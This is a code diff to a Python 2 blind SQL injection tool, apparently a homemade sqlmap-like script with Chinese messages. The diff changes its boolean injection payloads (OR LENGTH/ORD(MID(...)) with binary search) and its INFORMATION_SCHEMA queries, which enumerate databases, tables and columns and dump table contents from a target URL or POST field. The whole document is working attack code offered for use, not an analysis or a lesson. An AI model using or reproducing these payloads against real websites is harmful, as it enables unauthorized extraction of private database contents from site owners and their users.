@@ -39,8 +39,6 @@ def Argparse():
 
     args.add_argument('--dump',action="store_true", help=u'读取字段')
 
-    args.add_argument('--datadir',action="store_true", help=u'读取数据库路径')
-
     other = parser.add_argument_group('other arguments')
     other.add_argument('--level',metavar=u'level',help=u'程序运行级别:CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET')
     other.add_argument('--delay',metavar=u'num',default=0,help=u'访问延迟')
@@ -103,18 +101,18 @@ class MyBoolSqli():
         self.delay = delay
         self.hashvalue = self.run_url('')
 
-        self.payload_len = " %7C%7C LENGTH(({value})) {opt} {asc_num} LIMIT 1-- -"
-        self.payload_asc = " %7C%7C ASCII(MID(({value}),{asc_pos},1)) {opt} {asc_num} LIMIT 1-- -"
+        self.payload_len = " OR LENGTH(({value})) {opt} {asc_num} LIMIT 1-- -"
+        self.payload_asc = " OR ORD(MID(({value}),{asc_pos},1)) {opt} {asc_num} LIMIT 1-- -"
 
         self.payload_databases = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {pos}, 1"
         self.payload_tables = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={database} LIMIT {pos}, 1"
-        self.payload_columns = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} %26%26 TABLE_NAME={table_name} LIMIT {pos}, 1"
+        self.payload_columns = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} AND TABLE_NAME={table_name} LIMIT {pos}, 1"
         self.payload_data = "SELECT CONCAT({columns}) FROM {table_name} LIMIT {pos}, 1"
 
-        self.payload_num_databases = " %7C%7C (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) {opt} {asc_num} LIMIT 1 -- -"
-        self.payload_num_tables = " %7C%7C (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={database}) {opt} {asc_num} LIMIT 1 -- -"
-        self.payload_num_columns = " %7C%7C (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} %26%26 TABLE_NAME={table_name}) {opt} {asc_num} LIMIT 1 -- -"
-        self.payload_num_data = " %7C%7C (SELECT COUNT(CONCAT({columns})) FROM {table_name}) {opt} {asc_num} LIMIT 1 -- -"
+        self.payload_num_databases = " OR (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) {opt} {asc_num} LIMIT 1 -- -"
+        self.payload_num_tables = " OR (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={database}) {opt} {asc_num} LIMIT 1 -- -"
+        self.payload_num_columns = " OR (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} AND TABLE_NAME={table_name}) {opt} {asc_num} LIMIT 1 -- -"
+        self.payload_num_data = " OR (SELECT COUNT(CONCAT({columns})) FROM {table_name}) {opt} {asc_num} LIMIT 1 -- -"
 
     def run_url(self, payload):
         sleep(self.delay)
@@ -138,10 +136,13 @@ class MyBoolSqli():
             sys.exit()
 
     def get_num(self, value):
-        low, high = 1, 10
+        low, high = 1, 20
         while True:
             if low > high:
                 high += low
+            if high == 1:
+                LOG.info(u"数据为空")
+                sys.exit()
             mid = int(round((low + high) / 2.0))
             payload = value.format(opt="{opt}", asc_num=mid)
             if self.run_url(payload.format(opt=">")) != self.hashvalue:
@@ -152,7 +153,7 @@ class MyBoolSqli():
                 return mid
 
     def get_len(self, value, length):
-        low, high = 1, 10
+        low, high = 1, 20
         while True:
             if low > high:
                 high += low
@@ -166,10 +167,11 @@ class MyBoolSqli():
                 return mid
 
     def get_asc(self, value, length):
-        print "\n+" + "-" * 30 + "+\n| ",
         for asc_pos in range(1, length + 1):
             low, high = 1, 127
             while True:
+                if high == 0:
+                    low = 0
                 if low > high:
                     high += low
                 mid = int(round((low + high) / 2.0))
@@ -179,60 +181,84 @@ class MyBoolSqli():
                 elif self.run_url(payload.format(opt="<")) != self.hashvalue:
                     high = mid - 1
                 else:
-                    if chr(mid) == ",":
-                        print "\n+" + "-" * 30 + "+\n| ",
-                    else:
+                    if mid == 44:
+                        print "\n| ",
+                    elif mid < 127:
                         sys.stdout.write(chr(mid))
+                    else:
+                        print mid
+                        if mid >= 14909569:
+                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("utf-8"))
+                        elif mid >= 41633:
+                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("gbk"))
+                        else:
+                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("unicode"))
                     break
 
     def run_get_database(self):
         payload = self.payload_num_databases
         length = self.get_num(payload)
         LOG.info(u"数据数量:" + str(length))
+
         for i in range(length):
             value = self.payload_databases.format(pos=i)
             payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
             length = self.get_len(payload, i)
+
             payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
+            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
             self.get_asc(payload, length)
-        print "\n+" + "-" * 30 + "+"
+            print
+        print "+" + "-" * 30 + "+"
 
 
     def run_get_tables(self, database):
         payload = self.payload_num_tables.format(database=self.gethexstr(database), opt="{opt}", asc_num="{asc_num}")
         length = self.get_num(payload)
         LOG.info(u"数据数量:" + str(length))
+
         for i in range(length):
             value = self.payload_tables.format(pos=i, database=self.gethexstr(database))
             payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
             length = self.get_len(payload, i)
+
             payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
+            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
             self.get_asc(payload, length)
-        print "\n+" + "-" * 30 + "+"
+            print
+        print "+" + "-" * 30 + "+"
 
     def run_get_columns(self, database, table_name):
         payload = self.payload_num_columns.format(database=self.gethexstr(database), table_name=self.gethexstr(table_name), opt="{opt}", asc_num="{asc_num}")
         length = self.get_num(payload)
         LOG.info(u"数据数量:" + str(length))
+
         for i in range(length):
             value = self.payload_columns.format(pos=i, database=self.gethexstr(database), table_name=self.gethexstr(table_name))
             payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
             length = self.get_len(payload, i)
+
             payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
+            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
             self.get_asc(payload, length)
-        print "\n+" + "-" * 30 + "+"
+            print
+        print "+" + "-" * 30 + "+"
 
     def run_get_data(self, database, table_name, columns):
         payload = self.payload_num_data.format(table_name=table_name, columns=columns, opt="{opt}", asc_num="{asc_num}")
         length = self.get_num(payload)
         LOG.info(u"数据数量:" + str(length))
+
         for i in range(length):
             value = self.payload_data.format(pos=i, columns=columns, table_name=database + "." + table_name)
             payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
             length = self.get_len(payload, i)
+
             payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
+            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
             self.get_asc(payload, length)
-        print "\n+" + "-" * 30 + "+"
+            print
+        print "+" + "-" * 30 + "+"
 
     def getmd5(self, src):
         m = hashlib.md5()
@@ -246,16 +272,26 @@ class MyBoolSqli():
 ARGV = Argparse()
 LOG = classlog("log.txt", ARGV["level"])
 
-if ARGV["datadir"]:
-    MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_datadir()
+if ARGV["post"]:
+    temp = True
+    for i in ARGV["post"]:
+        if i.startswith("*"):
+            temp = False
+    if temp:
+        LOG.error(u"请指定注入点")
+        sys.exit()
+
+
 if ARGV["dbs"]:
     MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_database()
-if ARGV["tables"]:
+elif ARGV["tables"] and ARGV["D"]:
     MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_tables(ARGV["D"])
-if ARGV["columns"]:
+elif ARGV["columns"] and ARGV["D"] and ARGV["T"]:
     MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_columns(ARGV["D"], ARGV["T"])
-if ARGV["dump"]:
+elif ARGV["dump"] and ARGV["D"] and ARGV["T"] and ARGV["C"]:
     value = ""
     for x in ARGV["C"]:
-        value += x + ",0x20,"
+        value += x + ",0x2c,"
     MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_data(ARGV["D"], ARGV["T"], value[:-6])
+else:
+    LOG.error(u"参数错误")
